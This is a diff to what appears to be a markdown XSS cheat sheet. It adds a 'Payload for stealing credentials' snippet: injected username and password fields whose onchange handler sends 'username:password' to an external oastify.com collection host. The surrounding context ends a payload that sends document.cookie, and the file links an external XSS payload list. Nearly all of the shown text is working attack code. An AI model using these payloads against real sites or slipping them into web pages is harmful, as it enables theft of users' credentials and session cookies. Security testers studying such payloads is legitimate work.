@@ -17,6 +17,15 @@ body:document.cookie
 });
 </script>
 ```
+## Payload for stealing credentials
+```js
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
 #### External source of payloads
 https://github.com/payloadbox/xss-payload-list
 ##### For filter bypass
